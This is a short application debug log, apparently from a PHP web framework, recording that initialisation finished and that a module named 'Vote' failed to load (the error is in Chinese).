INFO: [ app_init ] --END-- [ RunTime:0.001633s ]
ERR: 无法加载模块:Vote

